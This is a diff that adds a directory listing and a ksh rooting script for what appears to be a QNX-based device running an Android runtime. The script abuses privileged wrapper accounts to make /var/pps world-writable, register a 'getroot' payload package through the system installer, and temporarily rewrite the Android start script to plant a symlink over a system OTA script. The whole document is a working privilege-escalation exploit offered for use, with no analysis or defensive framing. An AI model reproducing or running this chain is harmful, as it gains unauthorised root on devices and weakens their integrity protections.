@@ -1,0 +1,179 @@
+total 6981
+drwxrwxrwx   3 root      nto            4096 Sep 23 06:46 .
+drwxr-xr-x   4 devuser   devuser        4096 Sep 23 07:08 ..
+-rw-r--r--   1 root      nto         3496238 Feb 04  2026 Term49.bar
+drwxrwxrwx   2 racd      racd           4096 Sep 23 06:46 backup
+-rw-r--r--   1 root      nto           42903 May 25 23:58 getroot.bar
+-rwxrwxrwx   1 root      nto            5216 Apr 03  2026 install.sh
+-rwxr-xr-x   1 root      nto            8312 Apr 19 13:49 launcher_patcher
+-rwxr-xr-x   1 root      nto            7840 May 25 13:21 mod_nvram
+===
+#!/bin/ksh
+
+# --- Configuration & Paths ---
+readonly UPD_DIR="/var/android/"
+readonly INST_BASE="/accounts/devuser/rootdata/"
+readonly ANDROID_PLAYER="sys.android.gYABgKAOw1czN6neiAT72SGO.ns"
+readonly SCRIPT_PATH="/apps/${ANDROID_PLAYER}/native/scripts/"
+readonly START_SCRIPT="start-android-core.sh"
+readonly LOCK_FILE="/tmp/root_update.lock"
+readonly LOG_FILE="/tmp/root_update.log"
+
+# --- Logging Setup ---
+echo "--- Script started at $(date) ---" > "$LOG_FILE"
+
+log() {
+    typeset msg="$(date '+%Y-%m-%d %H:%M:%S') - $1"
+    print "$msg"
+    print "$msg" >> "$LOG_FILE"
+}
+
+# Wrapper to run commands via privileged utilities
+run_as() {
+    typeset wrapper="$1"
+    shift
+    log "Executing via $wrapper..."
+    $wrapper <<EOF >> "$LOG_FILE" 2>&1
+$@
+exit
+EOF
+}
+
+# --- Utility Functions ---
+
+# Count processes owned by android_* users via /proc metadata
+count_android_procs() {
+    # Check owner of 'as' (address space) files to identify android processes
+    ls -ld /proc/[0-9]*/as 2>/dev/null | grep -c " android_"
+}
+
+# Control Android system state (start/stop)
+manage_android() {
+    case "$1" in
+    start)
+        # Trigger launch to force registration update
+        run_as g_nto "qwaitfor /pps/services/launcher/control 60; print \"msg::start\ndat::${ANDROID_PLAYER},ORIENTATION=0\nid::blah\" > /pps/services/launcher/control"
+        log "Waiting for device nodes..."
+        # Wait for lowmemorykiller to ensure Android kernel is ready
+        qwaitfor /dev/android/lowmemorykiller 60
+        ;;
+    stop)
+        log "Stopping Android services..."
+        # Use privileged wrappers to signal init and other services
+        run_as __android_root "
+            [ -f /dev/android/lowmemorykiller ] && echo shrink:-20 > /dev/android/lowmemorykiller
+            sleep 1
+            slay -f init
+        "
+        run_as __android_system "slay -f shrimp"
+        ;;
+    esac
+}
+
+# Ensure all android processes are terminated
+wait_android_terminate() {
+    typeset ttt=$(count_android_procs)
+
+    while [ "$ttt" -gt 0 ]; do
+        log "Found $ttt active Android processes. Sending stop command..."
+        manage_android stop
+        sleep 2
+        ttt=$(count_android_procs)
+    done
+    log "All Android processes confirmed stopped."
+}
+
+# Ensure all android processes are terminated
+wait_android_start() {
+    typeset ttt=$(count_android_procs)
+
+    while [ "$ttt" -eq 0 ]; do
+        log "Found $ttt active Android processes. Sending start command..."
+        manage_android start
+        sleep 2
+        ttt=$(count_android_procs)
+    done
+    log "All Android processes confirmed started."
+}
+
+# --- Core Functions ---
+
+# Pre-installation
+preinstall_pkg() {
+    app="$1".`date -t`
+    appx="$1"
+
+    export app
+    export UPD_DIR
+
+    log "Action: Pre-installing ${appx}"
+
+    if [[ -z "$app" ]]; then
+        log "ERROR: app is empty before calling __pps"
+    fi
+
+    run_as __upd "
+        mkdir -p \"${UPD_DIR}${app}\"
+        unzip -q -o -d \"${UPD_DIR}${app}\" \"${INST_BASE}${appx}.bar\"
+    "
+
+    __pps <<EOF >> "$LOG_FILE" 2>&1
+        for p_path in /var/pps/system@*/installer@*/upd@*/current@*; do
+            if [ -d "\$p_path" ]; then
+                print -r "@\$app
+action::install_apk
+package_location::\${UPD_DIR}\$app
+extras::source::apk
+" > "\$p_path/\$app@88.88.777"
+                echo "Registered \$app in: \$p_path"
+            fi
+        done
+        exit 0
+EOF
+    unset app
+}
+# --- Main Logic ---
+
+# Check for active lock to prevent concurrent runs
+if [[ -f "$LOCK_FILE" ]]; then
+    log "CRITICAL: Lock file exists. Script execution aborted."
+    exit 1
+fi
+touch "$LOCK_FILE"
+
+# Clean up lock file on any exit signal
+trap 'rm -f "$LOCK_FILE"; log "Script finished. Lock removed."; echo "--- End of Log ---" >> "$LOG_FILE"' EXIT
+
+run_as g_pps "chmod -R 777 /var/pps"
+# Inject payload via pre-install routine
+preinstall_pkg "getroot"
+
+# Initialize backup of the system start script
+log "Ensuring backup directory exists..."
+mkdir -p "${INST_BASE}backup" && chmod 777 "${INST_BASE}backup"
+run_as __apps "[ ! -f \"${INST_BASE}backup/${START_SCRIPT}\" ] && cp \"${SCRIPT_PATH}${START_SCRIPT}\" \"${INST_BASE}backup/${START_SCRIPT}\" && echo 'Backup created successfully.'"
+
+wait_android_start
+# Terminate to apply changes during next start
+wait_android_terminate
+
+log "Phase: Injecting custom logic into ${START_SCRIPT}"
+run_as __apps "
+    chmod 777 \"${SCRIPT_PATH}${START_SCRIPT}\"
+    # Create new script with symlink payload and original content appended
+    print \"#!/bin/sh\nln -sPf /apps/${ANDROID_PLAYER}/native/system/xbin/btool /base/scripts/ota_info_pps.sh\n\" > \"${SCRIPT_PATH}${START_SCRIPT}\"
+    cat \"${INST_BASE}backup/${START_SCRIPT}\" >> \"${SCRIPT_PATH}${START_SCRIPT}\"
+"
+
+# Trigger app to execute injected symlink logic
+log "Launching android to verify injection..."
+wait_android_start
+sleep 10
+
+log "Phase: Restoring original script..."
+run_as __apps "cp -f \"${INST_BASE}backup/${START_SCRIPT}\" \"${SCRIPT_PATH}${START_SCRIPT}\""
+
+log "Final Action: Zone switch"
+run_as __upd "print '@sz\naction::switchzone\nsession::0\nzone:json:{\"radio\":\"false\",\"os\":\"true\"}\n' > /pps/system/installer/upd/current/sz"
+
+log "SUCCESS: All operations completed."
